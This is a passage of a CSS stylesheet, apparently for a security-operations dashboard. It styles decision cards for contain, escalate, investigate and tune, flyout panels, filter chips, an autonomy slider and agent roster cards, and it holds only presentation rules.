.ov-spark i{flex:1 1 0;min-width:0;background:var(--dec);border-radius:1px 1px 0 0;min-height:2px}
.ov-secnum{font-family:var(--mono);font-size:22px;font-weight:700;line-height:1;color:var(--dec)}
.ov-seclbl{display:inline-flex;align-items:center;gap:6px;font-size:10.5px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:var(--ink-2)}
.ov-secdot{width:7px;height:7px;border-radius:50%;background:var(--dec);flex:0 0 auto}
.ov-stat{appearance:none;background:none;border:none;font-family:inherit;cursor:default}
.ov-stat.ov-link{cursor:pointer;transition:background .12s}
.ov-stat.ov-link:hover{background:var(--bg-2)}
.ov-stat span{display:inline-flex;align-items:center;gap:3px}
.ov-stat svg{opacity:.5;transition:transform .14s ease}
.ov-stat.ov-link:hover svg{transform:translateY(2px);opacity:.85}
/* compact priority cards (everything after the featured one) */
.rad-compact-card{background:var(--panel)}
.rad-compact-card .rad-item-main{gap:11px}
.rad-compact-card .rad-ic{width:28px;height:28px;border-radius:7px}
.rad-compact-card .rad-title{font-size:13px}
.rad-compact-card .rad-ai{font-size:12px;line-height:1.5;margin-bottom:5px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.rad-compact-card .rad-hdr{margin-bottom:7px}
.rad-compact-card .rad-acts{margin-top:4px;padding-top:9px}
.rad-compact-card .rad-act,.rad-compact-card .rad-chat{padding:5px 10px;font-size:12px}
/* record opened as a right-side overlay flyout over the brief */
.body{position:relative}
.inspector.as-flyout{position:absolute;top:8px;right:8px;bottom:8px;width:540px!important;z-index:32;border:1px solid var(--line);border-radius:var(--r-lg);box-shadow:-20px 0 60px rgba(20,25,40,.18),var(--sh-lg);overflow:hidden;animation:flyin .27s cubic-bezier(.2,.75,.2,1)}
@keyframes flyin{from{opacity:0;transform:translateX(34px)}to{opacity:1;transform:none}}
.inspector.as-flyout.fly-out{animation:flyout .22s cubic-bezier(.4,0,1,1) forwards;pointer-events:none}
@keyframes flyout{to{opacity:0;transform:translateX(34px)}}
.inspector.as-flyout .resize-handle{display:none}
.inspector.no-trans{transition:none!important}
.insp-backdrop{position:absolute;inset:0;background:rgba(8,12,22,.58);z-index:31;animation:bdin .22s ease}
@keyframes bdin{from{opacity:0}}
.insp-backdrop.fly-out{animation:bdout .22s ease forwards;pointer-events:none}
@keyframes bdout{to{opacity:0}}
.radar-page{max-width:900px;position:relative}
.rad-prop{margin-top:13px;box-shadow:none;animation:radin .18s ease}
.rad-prop .prop-h{padding:11px 13px}
.rad-prop .prop-body{padding:13px 13px}
.rad-prop .prop-actions{padding:12px 13px}
.rad-prop .allowrow{padding:10px 13px}
/* ===== Brief: decision-type groups ===== */
.decision-sec{margin-bottom:22px}
.decision-h{align-items:center;margin-bottom:12px}
.decision-h{cursor:pointer;user-select:none}
.dec-caret{display:inline-flex;align-items:center;color:var(--ink-4);transition:transform .15s var(--ease,ease);margin-right:1px}
.dec-collapsed .dec-caret{transform:rotate(-90deg)}
.dec-collapsed .decision-body{display:none}
.dec-collapsed.decision-sec{margin-bottom:14px}
.dec-dot{width:9px;height:9px;border-radius:50%;flex:0 0 auto}
.dec-h-label{font-weight:700;letter-spacing:.06em}
.rad-dec{display:inline-flex;align-items:center;gap:5px;font-size:10.5px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;color:var(--dec);background:color-mix(in srgb,var(--dec) 13%,transparent);padding:4px 10px;border-radius:999px}
.rad-dec svg{color:var(--dec)}
.rad-dec.sm{font-size:9.5px;padding:2px 8px;gap:0}
.rad-inmotion{display:inline-flex;align-items:center;gap:6px;font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;color:var(--amber)}
.rad-assets{display:flex;flex-wrap:wrap;gap:6px;margin-top:9px}
.rad-assets .rad-chip{font-size:10.5px;padding:2px 9px;color:var(--ink-3)}
.decision-sec .rad-feat-card{margin-bottom:12px;background:linear-gradient(180deg,color-mix(in srgb,var(--dec) 7%,var(--panel)),var(--panel));border-color:color-mix(in srgb,var(--dec) 30%,var(--line))}
.decision-sec .rad-feat-card:hover{border-color:var(--dec)}
.decision-sec .rad-mini{background:linear-gradient(180deg,color-mix(in srgb,var(--dec) 4%,var(--panel)),var(--panel))}
.decision-sec .rad-mini:hover{border-color:var(--dec)}
.decision-passive .rad-mini{background:var(--panel)}
/* condensed proposal cards (everything after the featured one) */
.rad-mini{border:1px solid var(--line-2);border-radius:var(--r-md);background:var(--panel);padding:13px 15px;margin-bottom:8px;cursor:pointer;transition:border-color .13s,box-shadow .13s}
.rad-mini:hover{border-color:var(--sev);box-shadow:var(--sh-sm)}
.rad-mini-head{display:flex;align-items:flex-start;gap:10px}
.rad-mini-score{flex:0 0 auto;min-width:26px;height:26px;padding:0 5px;border-radius:7px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;font-family:var(--mono);color:var(--sev);background:color-mix(in srgb,var(--sev) 12%,transparent)}
.rad-mini-titlewrap{flex:1;min-width:0}
.rad-mini-titlerow{display:flex;align-items:baseline;gap:8px;flex-wrap:wrap}
.rad-mini-title{font-size:13px;font-weight:600;color:var(--ink-1)}
.rad-mini-motion{display:inline-flex;align-items:center;gap:3px;font-size:9.5px;font-weight:700;letter-spacing:.03em;text-transform:uppercase;color:var(--amber)}
.rad-mini-note{font-size:12px;line-height:1.5;color:var(--ink-3);margin-top:2px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.rad-mini-note b{color:var(--ink-2);font-weight:600}
.rad-mini-note code{font-family:var(--mono);font-size:10.5px;background:var(--bg-2);padding:1px 4px;border-radius:4px}
.rad-mini-when{flex:0 0 auto;font-size:11px;color:var(--ink-4);white-space:nowrap}
.rad-watchtag{display:inline-flex;align-items:center;gap:5px;flex:0 0 auto;font-size:11px;font-weight:600;color:var(--ink-4);white-space:nowrap}
.rad-watchtag-dot{width:5px;height:5px;border-radius:50%;background:var(--wc,var(--ink-4))}
.rad-watchacts{display:inline-flex;align-items:center;gap:10px;margin-right:auto;flex:0 1 auto;min-width:0;flex-wrap:wrap}
.rad-watchacts-k{font-size:10px;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:var(--ink-4)}
.rad-mini-meta{flex:0 0 auto;display:flex;flex-direction:column;align-items:flex-end;gap:7px}
.rad-watchrow{display:flex;flex-wrap:wrap;align-items:center;gap:7px;margin-top:9px}
.rad-watchrow-k{font-size:10px;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:var(--ink-4)}
.rad-mini-acts{margin-top:9px;padding-top:9px;border-top:1px dashed var(--line-2)}
.rad-mini-acts .rad-act-btns{gap:7px}
.rad-mini-acts .rad-act,.rad-mini-acts .rad-chat{padding:4px 10px;font-size:11.5px}
.rad-mini-more{align-self:center;font-size:10.5px;font-weight:500;color:var(--ink-4)}
.card-more-pop{position:fixed;z-index:9000;background:var(--panel);border:1px solid var(--line-2);border-radius:var(--r-md);box-shadow:0 6px 24px rgba(20,25,40,.16);padding:5px;display:flex;flex-direction:column;gap:2px;min-width:200px;animation:radin .14s ease}
.card-more-pop .cmp-item{display:flex;align-items:center;gap:8px;width:100%;text-align:left;appearance:none;border:none;background:none;font:inherit;font-size:12.5px;font-weight:550;color:var(--ink-1);padding:8px 10px;border-radius:var(--r-sm);cursor:pointer}
.card-more-pop .cmp-item:hover{background:var(--bg-2)}
.card-more-pop .cmp-item svg{color:var(--ink-3);flex:0 0 auto}
.card-more-pop .cmp-item.gated{color:var(--red-d)}
.card-more-pop .cmp-item.gated svg{color:var(--red)}
.decision-passive .rad-watch{display:flex;align-items:center;gap:10px;padding:7px 10px;cursor:pointer;transition:background .12s;border:none;margin-bottom:1px;border-radius:var(--r-sm)}
.decision-passive .rad-watch:hover{background:var(--bg-2)}
.decision-passive .rad-watch-ic{background:color-mix(in srgb,var(--dec) 12%,transparent);color:var(--dec);width:24px;height:24px}
.decision-passive .rad-watch-body{display:flex;align-items:center;gap:10px;min-width:0}
.decision-passive .rad-watch-top{margin-bottom:0;flex-wrap:nowrap;flex:0 0 auto}
.decision-passive .rad-watch-note{display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1 1 auto;min-width:0;-webkit-line-clamp:none}
/* ===== Situation overview — calmer stat blocks ===== */
.ov-eyebrow{color:var(--ink-3) !important}
/* borderless wrapper — let the inner cards carry the structure */
.ov{background:transparent !important;border:none !important;box-shadow:none !important;padding:0 !important;margin-bottom:40px}
/* a touch wider so the row of cards breathes */
.brief-mode .radar-page{max-width:960px}
.ov-secs{gap:8px}
.ov-sec{flex:1 1 0;min-width:168px;gap:9px;padding:13px 14px 14px;
  background:var(--panel) !important;
  border:1px solid var(--line) !important;
  box-shadow:0 1px 2px rgba(20,23,28,.04);
  transition:border-color .14s,box-shadow .14s,transform .14s}
.ov-sec:hover{border-color:var(--line-2) !important;box-shadow:0 4px 12px rgba(20,23,28,.07);transform:translateY(-1px)}
.ov-sec-top{display:flex;align-items:center;justify-content:space-between;width:100%}
.ov-sec-title{font-size:12px;font-weight:600;letter-spacing:-.01em;color:var(--ink-1)}
.ov-secdot{width:8px;height:8px;border-radius:50%;background:var(--dec);box-shadow:0 0 0 3px color-mix(in srgb,var(--dec) 16%,transparent);flex:0 0 auto}
.ov-spark{height:24px;gap:2.5px;margin:0}
.ov-spark i{background:var(--dec);border-radius:1.5px 1.5px 0 0}
.ov-spark-axis{display:flex;justify-content:space-between;width:100%;margin-top:3px;font-family:var(--mono);font-size:9px;font-weight:500;letter-spacing:0;color:var(--ink-4)}
.ov-spark-axis span{white-space:nowrap}
.ov-sec-figure{display:flex;align-items:baseline;gap:6px}
.ov-secnum{font-size:24px;color:var(--dec)}
.ov-secunit{font-size:11.5px;font-weight:500;color:var(--ink-4);font-family:var(--sans)}
.ov-secsub{font-size:11px;color:var(--ink-4);font-weight:450;letter-spacing:0;line-height:1.3}
/* affected-surface chips — reserve red for critical, neutral for the rest */
.ov-chip-high .ov-dot{background:var(--ink-4)}
.ov-chip-low .ov-dot{background:var(--ink-4)}
/* type glyph at the head of each surface chip — denotes user / host / db / group / identity */
.ov-chip-ic{display:inline-flex;align-items:center;justify-content:center;flex:0 0 auto;color:var(--ink-4);margin-left:-1px}
.ov-chip-ic svg{display:block}
.ov-chip-crit .ov-chip-ic{color:var(--red)}
.ov-chip.on .ov-chip-ic{color:var(--blue)}
.ov-chip.on .ov-chip-n{background:color-mix(in srgb,var(--blue) 16%,#fff);color:var(--blue-d)}
/* affected-surface = clickable multi-select filter chips (OR) + inline search when expanded */
.ov-affected-head{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:0;min-height:22px}
.ov-chips .ov-chip{cursor:pointer;transition:border-color .12s,background .12s,box-shadow .12s,color .12s}
.ov-chips .ov-chip:hover{border-color:var(--ink-4)}
.ov-chips .ov-chip.on:hover{border-color:var(--blue)}
.ov-chips .ov-chip.ov-more:hover{border-color:var(--ink-4);color:var(--ink-2)}
.ov-surface-search{display:inline-flex;align-items:center;gap:7px;height:22px;padding:0 4px 0 9px;border-radius:999px;background:var(--panel);border:1px solid var(--line-2);color:var(--ink-4);min-width:210px;transition:border-color .12s,box-shadow .12s}
.ov-surface-search:focus-within{border-color:var(--blue);box-shadow:0 0 0 1px var(--blue-ring);color:var(--blue)}
.ov-surface-search svg{flex:0 0 auto}
.ov-surface-input{flex:1;min-width:0;border:none;background:none;outline:none;font-family:var(--mono);font-size:12px;color:var(--ink-1)}
.ov-surface-input::placeholder{color:var(--ink-4);font-family:var(--sans)}
.ov-surface-x{flex:0 0 auto;display:inline-flex;align-items:center;justify-content:center;width:19px;height:19px;border:none;background:none;border-radius:999px;color:var(--ink-4);cursor:pointer;padding:0}
.ov-surface-x:hover{background:var(--bg-2);color:var(--ink-2)}
.ov-surface-empty{margin-top:9px;font-size:12px;color:var(--ink-4);font-style:italic}
/* filter bar — multiple surfaces joined with OR, each removable */
.sf-bar{flex-wrap:wrap}
.sf-bar-k{flex:0 0 auto;color:var(--ink-3)}
.sf-toks{display:inline-flex;align-items:center;flex-wrap:wrap;gap:6px;min-width:0}
.sf-tok{display:inline-flex;align-items:center;gap:6px;padding:3px 7px 3px 9px;border-radius:999px;background:var(--panel);border:1px solid color-mix(in srgb,var(--blue) 30%,transparent);color:var(--blue-d);font-family:var(--mono);font-size:12px;font-weight:500;cursor:pointer;transition:background .12s,border-color .12s}
.sf-tok:hover{background:var(--blue-bg);border-color:var(--blue)}
.sf-tok .sf-tok-ic{display:inline-flex;color:var(--blue)}
.sf-tok svg:last-child{opacity:.55}
.sf-tok:hover svg:last-child{opacity:1}
.sf-or{flex:0 0 auto;font-family:var(--sans);font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--ink-4)}
/* ===== Gated action — confirm in a right-side flyout over the brief ===== */
.act-fly-backdrop{position:absolute;inset:0;background:rgba(8,12,22,.58);z-index:44;animation:bdin .2s ease}
.act-fly-backdrop.fly-out{animation:bdout .2s ease forwards;pointer-events:none}
.act-fly{position:absolute;inset:0;z-index:45;display:flex;align-items:center;justify-content:center;padding:22px;overflow-y:auto;pointer-events:none}
.act-fly-card{width:100%;max-width:496px;pointer-events:auto;animation:flycenter .24s cubic-bezier(.32,.72,0,1)}
@keyframes flycenter{from{opacity:0;transform:translateY(10px) scale(.985)}to{opacity:1;transform:none}}
@keyframes flycenterout{to{opacity:0;transform:translateY(10px) scale(.985)}}
.act-fly-card .proposal{animation:none;margin:0;box-shadow:0 18px 50px rgba(20,25,40,.22),0 4px 12px rgba(20,25,40,.10)}
.act-fly-card .rad-prop{margin-top:0}
.act-fly.fly-out .act-fly-card{animation:flycenterout .2s cubic-bezier(.4,0,1,1) forwards}
/* ===== Small (mini) cards — more breathing room ===== */
.rad-mini{padding:16px 18px !important;margin-bottom:12px}
.rad-mini-head{gap:13px}
.rad-mini-titlerow{gap:9px;row-gap:4px}
.rad-mini-note{margin-top:4px;line-height:1.55}
.rad-mini-acts{margin-top:14px;padding-top:13px}
.rad-act-btns{gap:9px}
/* more separation between decision sections on the brief */
.decision-sec{margin-bottom:38px}
.decision-h{margin-bottom:14px}
/* hero agent icon — circular */
.rad-hero-bot{border-radius:50% !important}
/* selected card — record open in the flyout */
.rad-mini.sel, .rad-card.sel{border-color:color-mix(in srgb,var(--sev) 60%,var(--line)) !important;box-shadow:0 0 0 1px var(--sev),0 6px 18px color-mix(in srgb,var(--sev) 22%,transparent) !important}
.rad-mini.sel{background:color-mix(in srgb,var(--sev) 5%,var(--panel)) !important}
/* proposal cards — drop the colored tint; plain white, neutral resting border */
.rad-card{background:var(--panel) !important;border-color:var(--line) !important}
.rad-mini{background:var(--panel) !important}
.rad-feat-card{background:linear-gradient(180deg,color-mix(in srgb,var(--sev) 6%,var(--panel)),var(--panel)) !important;border-color:color-mix(in srgb,var(--sev) 30%,var(--line)) !important}
.rad-card:hover{border-color:var(--sev) !important}
/* ===== Recommended-action confirm expanded inline under the clicked action ===== */
.brec-inline{margin-top:-1px;animation:brecExpand .2s cubic-bezier(.32,.72,0,1)}
.brec-inline .proposal{margin:0;border-width:1px;box-shadow:0 2px 10px rgba(20,25,40,.07);animation:none}
.brec-btn.expanded{border-color:var(--blue);box-shadow:0 0 0 1px var(--blue);color:var(--blue-d,var(--ink-1))}
.brec-btn.expanded .brec-x{transform:rotate(90deg);transition:transform .18s}
@keyframes brecExpand{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}

/* ===== Overview stat enrichments (shared) ===== */
.ov-secstat{display:flex;flex-wrap:wrap;align-items:center;gap:3px 9px}
.ov-secsev{display:inline-flex;align-items:center;gap:5px;font-size:10.5px;font-weight:500;color:var(--ink-3);white-space:nowrap}
.ovs-dot{width:6px;height:6px;border-radius:50%;background:var(--ink-4);flex:0 0 auto}
.ovs-dot.crit{background:var(--red)}
.ovs-dot.high{background:var(--amber)}
.ovs-dot.med{background:#d4791a}
.ovs-dot.mtn{background:var(--ink-4)}
.ov-chip-n{display:inline-flex;align-items:center;justify-content:center;min-width:17px;height:16px;padding:0 5px;margin-left:7px;border-radius:999px;background:var(--bg-2);color:var(--ink-3);font-size:10px;font-weight:600;font-family:var(--mono);line-height:1}

/* ============================================================
   DAY BRIEF — minimal / condensed redesign (NotDaybreak only)
   Neutral ink throughout; color reserved for tiny severity dots
   and the moment-of-action confirm. Scoped to body.mode-day.
   ============================================================ */
/* greeting: compact, left-aligned, no hero glyph */
body.mode-day .brief-scroll .radar-page{padding-top:36px !important}
body.mode-day .brief-scroll .radar-greet{justify-content:flex-start;text-align:left;margin-bottom:24px}
body.mode-day .brief-scroll .radar-greet-l{text-align:left}
body.mode-day .brief-scroll .rad-hero-bot{display:none !important}
body.mode-day .brief-scroll .radar-by{text-align:left;font-size:11.5px;color:var(--ink-4)}
body.mode-day .brief-scroll .radar-hi{text-align:left;font-size:15px;font-weight:600;line-height:1.45;color:var(--ink-2);max-width:640px;margin-top:4px}
body.mode-day .brief-scroll .radar-hi b{font-weight:650;color:var(--ink-0)}

/* refined brief header */
.brief-scroll .brief-head{display:block;margin-bottom:28px;max-width:760px;border:none !important;background:transparent !important;padding:0 !important;border-radius:0 !important;box-shadow:none !important}
.brief-scroll .brief-eyebrow{display:flex;align-items:center;gap:10px;margin-bottom:18px;flex-wrap:wrap}
.brief-settings{position:absolute;top:19px;right:30px;z-index:2;display:inline-flex;align-items:center;justify-content:center;width:30px;height:30px;padding:0;border-radius:var(--r-md);border:none;background:transparent;color:var(--ink-3);cursor:pointer;transition:background .12s,color .12s,box-shadow .12s}
.brief-settings:hover{background:var(--bg-2);color:var(--ink-1)}
.brief-settings svg{display:block}
.brief-hist{right:68px}
.brief-hist.on{background:var(--accent-bg);color:var(--accent-d)}
.brief-hist.on:hover{background:var(--accent-bg)}
body.mode-day .brief-scroll .brief-settings{top:37px}
/* ===== Autonomy quick popover (brief gear) ===== */
.brief-settings.pop-on{background:var(--accent-bg);color:var(--accent-d)}
.brief-settings.pop-on:hover{background:var(--accent-bg)}
.aut-pop{position:fixed;z-index:300;width:360px;background:var(--panel);border:1px solid var(--line);border-radius:var(--r-md);box-shadow:var(--sh-lg);padding:14px 16px 0;animation:pop .15s ease}
.aut-h{display:flex;align-items:center;gap:9px}
.aut-h-ic{display:grid;place-items:center;width:26px;height:26px;border-radius:50%;background:color-mix(in srgb,var(--accent) 14%,transparent);color:var(--accent);flex:0 0 auto}
.aut-h-t{display:flex;flex-direction:column;min-width:0}
.aut-h-t b{font-size:13px;font-weight:600;color:var(--ink-0);letter-spacing:-.01em;line-height:1.25}
.aut-h-t span{font-size:11px;color:var(--ink-4);line-height:1.35}
.aut-h-lv{display:none}
.aut-slider{outline:none;margin-top:15px}
.aut-rail{position:relative;height:10px;border-radius:999px;background:color-mix(in srgb,var(--ink-4) 14%,transparent);margin:8px 10px 0;cursor:pointer;touch-action:none}
.aut-fill{position:absolute;left:0;top:0;height:100%;border-radius:999px;background:linear-gradient(90deg,color-mix(in srgb,var(--accent) 55%,var(--panel)),var(--accent));pointer-events:none;transition:width .18s cubic-bezier(.3,1.2,.5,1)}
.aut-stop{position:absolute;top:0;bottom:0;width:3px;border-radius:999px;background:var(--panel);transform:translateX(-50%);pointer-events:none}
.aut-stop:nth-child(2),.aut-stop:nth-child(6){display:none}
.aut-thumb{position:absolute;top:50%;left:100%;width:20px;height:20px;border-radius:50%;background:#fff;border:1px solid rgba(20,23,28,.08);box-shadow:0 1px 2px rgba(20,23,28,.16),0 3px 9px rgba(20,23,28,.14);transform:translate(-50%,-50%);cursor:grab;transition:left .18s cubic-bezier(.3,1.2,.5,1),transform .15s ease;pointer-events:none}
.aut-thumb::after{content:"";position:absolute;inset:0;margin:auto;width:7px;height:7px;border-radius:50%;background:var(--accent)}
.aut-rail:hover .aut-thumb{transform:translate(-50%,-50%) scale(1.08)}
.aut-rail.drag{cursor:grabbing}
.aut-rail.drag .aut-thumb,.aut-rail.drag .aut-fill{transition:transform .15s ease}
.aut-rail.drag .aut-thumb{transform:translate(-50%,-50%) scale(1.14)}
.aut-slider:focus-visible .aut-thumb{box-shadow:0 1px 2px rgba(20,23,28,.16),0 3px 9px rgba(20,23,28,.14),0 0 0 3px var(--accent-ring)}
.aut-stopls{position:relative;height:22px;margin:7px 10px 0}
.aut-stopls span{position:absolute;top:0;font-size:10.5px;font-weight:600;color:var(--ink-4);cursor:pointer;letter-spacing:.01em;white-space:nowrap;transform:translateX(-50%);padding:3px 9px;border-radius:999px;transition:color .12s,background .12s}
.aut-stopls span.first{transform:none;margin-left:-9px}
.aut-stopls span.last{transform:translateX(-100%);margin-left:9px}
.aut-stopls span:hover{color:var(--ink-1);background:var(--bg-2)}
.aut-stopls span.on{color:var(--accent-d);background:color-mix(in srgb,var(--accent) 12%,transparent)}
.aut-pop .aut-stopls span{padding:3px 6px}
.aut-pop .aut-stopls span.first{margin-left:-6px}
.aut-pop .aut-stopls span.last{margin-left:6px}
.aut-read{margin-top:12px;min-height:58px}
.aut-read b{display:block;font-size:12.5px;font-weight:600;color:var(--ink-0);letter-spacing:-.005em}
.aut-read p{margin:3px 0 0;font-size:11.5px;line-height:1.55;color:var(--ink-3)}
.aut-f{display:flex;margin:12px -16px 0;border-top:1px solid var(--line-2)}
.aut-link{flex:1;display:flex;align-items:center;gap:7px;padding:10px 16px;font-size:12px;font-weight:600;color:var(--ink-1);cursor:pointer;border-radius:0 0 var(--r-md) var(--r-md)}
.aut-link:hover{background:var(--bg-2);color:var(--ink-0)}
.aut-link .lk-arr{margin-left:auto;color:var(--ink-4)}
/* ===== Agent roster cards ===== */
.agcard.day,.agcard.night,.agcard.muted{border-top:1px solid var(--line)}
.agcard{--tone:var(--blue)}
.agcard.day{--tone:#d2761c}
.agcard.night{--tone:#6a5bd8}
.agcard.muted{--tone:#8b93a6}
.ag-live{margin-left:auto;display:inline-flex;align-items:center;gap:6px;font-size:11.5px;font-weight:600;color:var(--ink-1);white-space:nowrap}
.ag-live i{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 0 3px color-mix(in srgb,var(--green) 16%,transparent)}
.ag-live.draft{color:var(--ink-3)}
.ag-live.draft i{background:transparent;border:1.5px solid var(--ink-4);box-shadow:none}
.ag-stats{display:grid;grid-template-columns:1.25fr 1fr 1fr;background:linear-gradient(135deg,color-mix(in srgb,var(--tone) 13%,transparent),color-mix(in srgb,var(--tone) 4%,transparent));border-radius:var(--r-md);padding:11px 14px 10px}
.ag-stats.two{grid-template-columns:1.3fr 1fr}
.ag-stat{min-width:0}
.ag-stat+.ag-stat{border-left:1px solid color-mix(in srgb,var(--tone) 26%,transparent);padding-left:14px}
.ag-stat-v{display:flex;align-items:flex-end;gap:8px;font-size:17px;line-height:1.1;font-weight:650;color:var(--ink-0);letter-spacing:-.01em}
.ag-stat-k{display:block;margin-top:4px;font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.05em;color:color-mix(in srgb,var(--tone) 62%,var(--ink-2));white-space:nowrap}
.ag-stats.off .ag-stat-v{color:var(--ink-4);font-weight:500}
.ag-spark{flex:0 0 auto;margin-bottom:1px}
.ag-spark rect{fill:var(--tone);opacity:.3}
.ag-spark rect:nth-last-child(-n+3){opacity:.6}
.ag-spark rect:last-child{opacity:1}
.ag-rows{display:flex;flex-direction:column;gap:0}
.ag-row{display:flex;align-items:baseline;justify-content:space-between;gap:18px;padding:3px 0;font-size:12.5px}
.ag-row span{color:var(--ink-4);flex:0 0 auto}
.ag-row b{font-weight:500;color:var(--ink-1);text-align:right;min-width:0}
.ag-foot .ag-last,.ag-h .ag-last{margin-left:auto;align-self:center;font-size:11.5px;color:var(--ink-4);white-space:nowrap}
/* inline autonomy meter on watch cards */
.aut i{width:10px}
.ag-row .aut{vertical-align:middle}
.ag-aut2{padding:12px 0 9px;border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
.ag-aut2-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:2px}
.ag-aut2 .aut-h-lv{background:color-mix(in srgb,var(--tone) 10%,transparent);color:color-mix(in srgb,var(--tone) 70%,var(--ink-0))}
.ag-aut2 .aut-slider{margin-top:8px}
.ag-aut2 .aut-read{margin-top:10px;min-height:37px}
.ag-aut2 .aut-read b{display:inline;font-size:12px}
.ag-aut2 .aut-read p{display:inline;margin:0 0 0 4px;font-size:11.5px}
.ag-aut2 .aut-read p::before{content:"— "}
.agcard .aut-fill{background:linear-gradient(90deg,color-mix(in srgb,var(--tone) 55%,var(--panel)),var(--tone))}
.agcard .aut-thumb::after{background:var(--tone)}
.agcard .aut-stopls span.on{color:color-mix(in srgb,var(--tone) 78%,var(--ink-0));background:color-mix(in srgb,var(--tone) 12%,transparent)}
.brief-scroll .brief-agent{display:inline-flex;align-items:center;gap:7px;font-size:13px;font-weight:600;color:var(--ink-0);letter-spacing:-.01em}
.brief-scroll .brief-agent-ic{display:grid;place-items:center;width:24px;height:24px;border-radius:50%;background:color-mix(in srgb,var(--accent) 14%,transparent);color:var(--accent)}
.brief-scroll .brief-role{font-size:11px;font-weight:500;color:var(--ink-3);padding:2px 9px;border:1px solid var(--line);border-radius:var(--r-pill)}
.brief-scroll .brief-eyebrow-sp{flex:1 1 auto}
.brief-scroll .brief-date{display:inline-flex;align-items:center;gap:5px;font-size:11.5px;color:var(--ink-4)}
.brief-scroll .brief-date svg{opacity:.7}
.brief-scroll .brief-watch{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:500;color:var(--green-d,#1f8a5b);background:color-mix(in srgb,var(--green,#1f8a5b) 12%,transparent);padding:3px 10px;border-radius:var(--r-pill)}
.brief-scroll .brief-watch-dot{width:6px;height:6px;border-radius:50%;background:var(--green,#1f8a5b);box-shadow:0 0 0 0 color-mix(in srgb,var(--green,#1f8a5b) 60%,transparent);animation:briefPulse 2.4s var(--ease,cubic-bezier(.32,.72,0,1)) infinite}
@keyframes briefPulse{0%{box-shadow:0 0 0 0 color-mix(in srgb,var(--green,#1f8a5b) 55%,transparent)}70%{box-shadow:0 0 0 5px transparent}100%{box-shadow:0 0 0 0 transparent}}
.brief-scroll .brief-title{margin:0;font-family:var(--font-display,inherit);font-size:30px;line-height:1.12;font-weight:600;letter-spacing:-.02em;color:var(--ink-4)}
.brief-scroll .brief-title-em{color:var(--ink-0)}
.brief-scroll .brief-subline{margin:10px 0 0;font-size:14.5px;line-height:1.5;color:var(--ink-2);max-width:600px}
body.mode-day .brief-scroll .radar-page{padding-top:40px !important}

/* overview: one flat segmented strip, neutral counts, no sparklines */
body.mode-day .brief-scroll .ov{margin-bottom:26px !important}
body.mode-day .brief-scroll .ov-secs{gap:10px;border:none;background:transparent}
body.mode-day .brief-scroll .ov-sec{flex:1 1 0;min-width:0;padding:14px 16px !important;gap:8px !important;background:var(--panel) !important;border:1px solid var(--line) !important;border-radius:var(--r-md) !important;box-shadow:0 1px 2px rgba(20,23,28,.04) !important;transform:none !important}
body.mode-day .brief-scroll .ov-sec:hover{background:var(--panel) !important;transform:none !important;box-shadow:0 2px 10px rgba(20,23,28,.08) !important;border-color:var(--line-2) !important}
body.mode-day .brief-scroll .ov-spark{display:flex !important;order:5;height:22px;gap:2px;margin-top:5px;width:100%}
body.mode-day .brief-scroll .ov-spark i{border-radius:2px 2px 0 0}
body.mode-day .brief-scroll .ov-spark-axis{order:6;margin-top:4px}
body.mode-day .brief-scroll .ov-secdot{display:block !important;width:7px !important;height:7px !important;border-radius:50% !important;background:var(--dec) !important;box-shadow:none !important}
body.mode-day .brief-scroll .ov-sec-top{justify-content:flex-start !important;gap:7px}
/* active decision blocks → separate bordered cards with a gap between each */
body.mode-day .brief-scroll #sec-contain,
body.mode-day .brief-scroll #sec-escalate,
body.mode-day .brief-scroll #sec-investigate,
body.mode-day .brief-scroll #sec-tune{border:1px solid color-mix(in srgb,var(--dec) 13%,var(--line)) !important;border-radius:var(--r-md) !important;background:linear-gradient(180deg,color-mix(in srgb,var(--dec) 9%,var(--panel)) 0px,var(--panel) 150px) !important;padding:0 !important;margin:0 0 14px !important}
body.mode-day .brief-scroll #sec-tune{margin-bottom:14px !important}
body.mode-day .brief-scroll #sec-contain .decision-h,
body.mode-day .brief-scroll #sec-escalate .decision-h,
body.mode-day .brief-scroll #sec-investigate .decision-h,
body.mode-day .brief-scroll #sec-tune .decision-h{margin:0 !important;padding:12px 12px 9px !important}
body.mode-day .brief-scroll #sec-contain .rad-mini:last-child,
body.mode-day .brief-scroll #sec-escalate .rad-mini:last-child,
body.mode-day .brief-scroll #sec-investigate .rad-mini:last-child,
body.mode-day .brief-scroll #sec-tune .rad-mini:last-child,
body.mode-day .brief-scroll #sec-contain .rad-auto:last-child,
body.mode-day .brief-scroll #sec-escalate .rad-auto:last-child,
body.mode-day .brief-scroll #sec-investigate .rad-auto:last-child,
body.mode-day .brief-scroll #sec-tune .rad-auto:last-child{border-bottom:none !important}
/* dividers tinted to the category color so they harmonize with the tint */
body.mode-day .brief-scroll #sec-contain .decision-h,
body.mode-day .brief-scroll #sec-escalate .decision-h,
body.mode-day .brief-scroll #sec-investigate .decision-h,
body.mode-day .brief-scroll #sec-tune .decision-h,
body.mode-day .brief-scroll #sec-contain .rad-mini,
body.mode-day .brief-scroll #sec-escalate .rad-mini,
body.mode-day .brief-scroll #sec-investigate .rad-mini,
body.mode-day .brief-scroll #sec-tune .rad-mini,
body.mode-day .brief-scroll #sec-contain .rad-auto,
body.mode-day .brief-scroll #sec-escalate .rad-auto,
body.mode-day .brief-scroll #sec-investigate .rad-auto,
body.mode-day .brief-scroll #sec-tune .rad-auto{border-bottom-color:color-mix(in srgb,var(--dec) 13%,var(--line)) !important}
/* resolved-autonomously receipts block gets the same tinted-card treatment */
